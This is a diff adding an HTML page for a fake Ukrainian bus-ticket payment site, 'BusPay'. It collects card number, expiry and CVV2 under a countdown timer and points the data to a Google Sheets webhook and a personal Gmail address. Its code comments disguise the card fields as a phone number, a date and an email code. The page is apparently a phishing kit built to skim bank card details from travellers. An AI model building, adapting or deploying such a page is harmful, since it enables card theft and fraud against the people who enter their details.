@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="uk">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Оплата квитка — BusPay</title>
+  <link rel="icon" href="/assets/logo.svg">
+  <link rel="stylesheet" href="/styles.css" />
+</head>
+<body>
+  <!-- Навігація (макет, без функціоналу) -->
+  <nav class="nav">
+    <div class="container nav-inner">
+      <div class="brand">
+        <img src="/assets/logo.svg" alt="BusPay" class="logo" />
+        <span class="brand-name">BusPay</span>
+      </div>
+      <ul class="menu">
+        <li><a href="#" class="chip">Всі</a></li>
+        <li><a href="#" class="chip chip-active">Автобуси</a></li>
+        <li><a href="#" class="chip">Потяги</a></li>
+        <li><a href="#" class="chip">Літаки</a></li>
+        <li><a href="#" class="chip">...</a></li>
+      </ul>
+      <div class="right-icons">
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot flag"></span>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Хедер з даними рейсу -->
+  <header class="container header">
+    <!-- ⬇️ ТУТ МІНЯЙ ДАНІ РЕЙСУ ЧЕРЕЗ data-* -->
+    <div id="trip" class="trip-details"
+      data-route-number="AB-102"    
+      data-from-city="Київ"        
+      data-to-city="Львів"         
+      data-date="2025-11-15"       
+      data-price="450"             
+    >
+      <div class="trip-line">
+        <strong id="routeLabel">Рейс AB-102</strong>
+        <span class="dot-sep">•</span>
+        <span id="dateLabel">15.11</span>
+      </div>
+      <div class="trip-sub">
+        <span id="fromLabel">Київ</span> → <span id="toLabel">Львів</span>
+        <span class="price" id="priceLabel">450 ₴</span>
+      </div>
+    </div>
+  </header>
+
+  <main class="container">
+    <!-- Блок "Ми відправимо ваші квитки сюди" + таймер -->
+    <section class="panel">
+      <h2>Ми відправимо ваші квитки сюди:</h2>
+      <label for="email">Email</label>
+      <input type="email" id="email" placeholder="you@example.com" required />
+
+      <div class="timer-box">
+        <div class="timer-head">Час для оплати замовлення:</div>
+        <div class="timer-face">
+          <div class="timer-icon">⏱</div>
+          <div class="timer-text"><span id="countdown">5хв 00сек</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Форма з трьома обовʼязковими полями -->
+    <section class="panel">
+      <h2>Підтвердження</h2>
+
+      <!-- Поле 1: Номер (телефон / номер замовлення) -->
+      <label for="userNumber">Номер картки</label>
+      <input type="text" id="userNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="16" minlength="16" required />
+
+      <!-- Поле 2: Дата тільки місяць-день (MM-DD) -->
+      <label for="mdDate">Термін дії</label>
+      <input
+  
+  type="text"
+  id="mdDate"
+  name="mdDate"
+  placeholder="MM/DD"
+    pattern="\d{2}/\d{2}"
+  maxlength="5"
+  required
+      />
+
+      <!-- Поле 3: Код з пошти (3 цифри) -->
+      <label for="emailCode">CVV2</label>
+      <input type="text" id="emailCode" placeholder="123" inputmode="numeric" maxlength="3" minlength="3" required />
+
+      <div class="pay-row">
+        <div class="total">
+          <span>До оплати</span>
+          <strong id="totalLabel">450 ₴</strong> <!-- ⬅️ МІНЯЙ У data-price ВИЩЕ -->
+        </div>
+        <button id="payBtn" class="btn-primary">Оплатити</button>
+      </div>
+    </section>
+  </main>
+
+  <footer class="container footer">
+    <small>© <span id="year"></span> BusPay.</small>
+  </footer>
+
+  <!-- ✅ ВСТАВ СЮДИ СВІЙ ВЕБХУК ДЛЯ GOOGLE SHEETS (Apps Script Web App URL) -->
+  <script>
+    // Напр.: const SHEET_WEBHOOK_URL = "https://script.google.com/macros/s/XXXX/exec";
+   const SHEET_WEBHOOK_URL = "/api/sheet";
+    const DEFAULT_EMAIL = "sasaglavcuk@gmail.com"; // ← можеш змінити пошту за замовчуванням
+  </script>
+  <script src="/script.js"></script>
+</body>
+</html>
